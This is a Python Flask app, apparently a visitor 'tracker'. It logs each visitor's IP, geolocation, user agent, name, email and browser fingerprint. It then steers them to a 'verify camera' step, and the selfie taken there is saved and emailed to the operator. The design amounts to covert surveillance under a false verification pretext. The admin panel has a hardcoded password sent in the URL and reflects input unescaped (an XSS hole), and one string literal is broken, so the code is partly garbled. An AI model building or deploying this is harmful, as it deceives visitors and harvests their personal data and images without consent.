from flask import Flask, request, render_template, redirect, url_for
from datetime import datetime
import requests
import sqlite3
import os
import smtplib
from email.message import EmailMessage
import base64

app = Flask(__name__)
DB_FILE = "tracker.db"
GEOIP_API = "https://ipapi.co/{}/json/"

EMAIL_SENDER = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"
EMAIL_RECEIVER = "your_email@gmail.com"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            location TEXT,
            user_agent TEXT,
            name TEXT,
            email TEXT,
            fingerprint TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/", methods=["GET", "POST"])
def index():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    location = "Unknown"

    try:
        geo = requests.get(GEOIP_API.format(ip)).json()
        location = f"{geo.get('city', 'N/A')}, {geo.get('country_name', 'N/A')}"
    except:
        pass

    if request.method == "POST":
        name = request.form.get("name")
        email = request.form.get("email")
        fingerprint = request.form.get("fingerprint")

        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO visits (timestamp, ip, location, user_agent, name, email, fingerprint) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (now, ip, location, user_agent, name, email, fingerprint))
        conn.commit()
        conn.close()

        return redirect(url_for('verify_camera'))

    return render_template("index.html")

@app.route("/verify-camera")
def verify_camera():
    return render_template("camera.html")

@app.route("/upload-selfie", methods=["POST"])
def upload_selfie():
    data_url = request.form.get("imageData")
    if data_url:
        header, encoded = data_url.split(",", 1)
        image_data = base64.b64decode(encoded)
        filename = f"selfie_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

        # Save locally
        with open(os.path.join("static", filename), "wb") as f:
            f.write(image_data)

        # Email selfie
        try:
            msg = EmailMessage()
            msg["Subject"] = "📸 New Selfie Captured"
            msg["From"] = EMAIL_SENDER
            msg["To"] = EMAIL_RECEIVER
            msg.set_content("A new selfie has been captured and attached.")

            msg.add_attachment(image_data, maintype='image', subtype='jpeg', filename=filename)

            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                smtp.send_message(msg)
        except Exception as e:
            print("Failed to send email:", e)

    return "✅ Selfie received. You may close this tab."


from flask import Response

ADMIN_PASSWORD = "ADMIN"

@app.route("/admin", methods=["GET", "POST"])
def admin():
    auth = request.args.get("auth")
    if auth != ADMIN_PASSWORD:
        return "<h3>Access Denied</h3><form><input name='auth' placeholder='Enter admin password'><button type='submit'>Login</button></form>"

    query = request.args.get("q", "")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    if query:
        c.execute("SELECT * FROM visits WHERE name LIKE ? OR email LIKE ? OR ip LIKE ? OR fingerprint LIKE ?", 
                  (f"%{query}%", f"%{query}%", f"%{query}%", f"%{query}%"))
    else:
        c.execute("SELECT * FROM visits ORDER BY id DESC")

    rows = c.fetchall()
    conn.close()

    table = "<table border='1' cellpadding='5'><tr><th>ID</th><th>Time</th><th>IP</th><th>Location</th><th>User Agent</th><th>Name</th><th>Email</th><th>Fingerprint</th></tr>"
    for row in rows:
        table += "<tr>" + "".join([f"<td>{str(cell)}</td>" for cell in row]) + "</tr>"
    table += "</table>"

    return f"""
    <h2>Visitor Logs</h2>
    <form method='get'>
        <input type='hidden' name='auth' value='{auth}'>
        <input name='q' placeholder='Search...' value='{query}'>
        <button type='submit'>Search</button>
    </form>
    <a href='/export?auth={auth}'>📥 Download CSV</a>
    <br><br>
    {table}
    """

@app.route("/export")
def export():
    auth = request.args.get("auth")
    if auth != ADMIN_PASSWORD:
        return "Access Denied"

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM visits ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()

    def generate_csv():
        output = []
        header = ["ID", "Timestamp", "IP", "Location", "User Agent", "Name", "Email", "Fingerprint"]
        output.append(",".join(header))
        for row in rows:
            output.append(",".join(['"' + str(cell).replace('"', '""') + '"' for cell in row]))
        return "
".join(output)

    return Response(generate_csv(), mimetype="text/csv", headers={"Content-Disposition": "attachment; filename=logs.csv"})
